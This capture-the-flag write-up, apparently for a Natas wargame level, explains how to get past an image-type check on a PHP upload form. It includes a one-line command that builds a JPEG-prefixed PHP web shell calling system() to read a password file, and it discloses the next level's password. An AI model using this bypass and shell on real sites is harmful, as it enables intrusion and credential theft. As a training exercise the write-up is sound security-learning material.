The page has a link to its redacted source code. It's similar to the previous one, page is an upload form. As we control the request filename parameter we can control the extension of the file upload on the server. However here the server-side code verifies the upload is actually an image file:
```
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```

It looks like exif_imagetype() just reads the file magic number to determine its type. So we can craft a file which starts with the JPEG magic bytes and then has PHP code:
```
(echo 'ff d8 ff' | xxd -r -p -; echo '<?php system("cat /etc/natas_webpass/natas14"); ?>') > hack.php
```

Then we just upload the file (using some Burp magic to modify the filename parameter and change its extension to php), then we can invoke and run arbitrary PHP commands.

Password for the next level is `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`.
